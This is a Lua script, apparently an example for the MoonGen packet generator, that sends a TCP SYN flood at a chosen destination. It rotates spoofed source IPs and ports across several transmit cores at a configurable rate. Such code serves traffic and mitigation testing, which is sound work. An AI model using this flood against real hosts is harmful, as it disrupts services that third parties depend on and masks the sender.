local mg     = require "moongen"
local memory = require "memory"
local device = require "device"
local stats  = require "stats"
local log    = require "log"

function configure(parser)
	parser:description("Generates TCP SYN flood from varying source IPs and ports.")
	parser:argument("dev", "Device to transmit from."):convert(tonumber)
	parser:option("-r --rate", "Transmit rate in Mbit/s."):default("0"):convert(tonumber)
	parser:option("-c --core", "Number of cores."):default("1"):convert(tonumber)
	parser:option("-s --src", "Source IP address."):default("10.0.0.1")
	parser:option("-d --dst", "Destination IP address.")
	parser:option("--dmac", "Destination MAC address.")
	parser:option("--sport", "Source port."):default("1000"):convert(tonumber)
	parser:option("--dport", "Destination port."):default("80"):convert(tonumber)
	parser:option("--ipsnum", "Number of different source IPs to use."):default("100"):convert(tonumber)
	parser:option("--portsnum", "Number of different source ports to use."):default("100"):convert(tonumber)
	parser:option("-l --len", "Length of the ethernet frame containing the SYN packet (including CRC)"):default("64"):convert(tonumber)
end

function master(args)
	local minIp = parseIP4Address(args.src)
	if not minIp then
		log:fatal("Invalid source IP: %s", args.src)
	end

	local dev = device.config{port = args.dev, txQueues = args.core}
	dev:wait()

	if args.rate > 0 then
		for i=0,args.core-1 do
			dev:getTxQueue(i):setRate(args.rate / args.core)
		end
	end

  local computeStats
	for i=0,args.core-1 do
		if i == 0 then
			computeStats = true
		else
			computeStats = false
		end
		mg.startTask("loadSlave", dev:getTxQueue(i), minIp, args.ipsnum, args.dst,
		             args.dmac, args.sport, args.portsnum, args.dport,
								 args.len, computeStats)
  end

	mg.waitForTasks()
end

function loadSlave(queue, minIp, numIps, dst, dmac, minSPort, numPorts, dPort,
	                 len, computeStats)
	local mem = memory.createMemPool(function(buf)
		buf:getTcpPacket():fill{ 
			ethSrc = queue,
			ethDst = dmac,
			ip4Dst = dst,
			tcpDst = dPort,
			tcpSyn = 1,
			tcpSeqNumber = 1,
			tcpWindow = 10,
			pktLength = len - 4
		}
	end)

	local bufs = mem:bufArray(128)
	local ipCounter = 0
	local portCounter = 0

	if computeStats then
		txStats = stats:newDevTxCounter(queue, "plain")
	end

	while mg.running() do
		bufs:alloc(len - 4)
		for i, buf in ipairs(bufs) do 			
			local pkt = buf:getTcpPacket(ipv4)

			pkt.ip4.src:set(minIp)
			pkt.ip4.src:add(ipCounter)
			pkt.tcp:setSrcPort((minSPort + portCounter) % 0xffff)
			
			ipCounter = incAndWrap(ipCounter, numIps)
			if ipCounter == 0 then
				portCounter = incAndWrap(portCounter, numPorts)
			end
		end 

		bufs:offloadTcpChecksums(ipv4)

		queue:send(bufs)

		if computeStats then
			txStats:update()
		end
	end

	if computeStats then
		txStats:finalize()
	end
end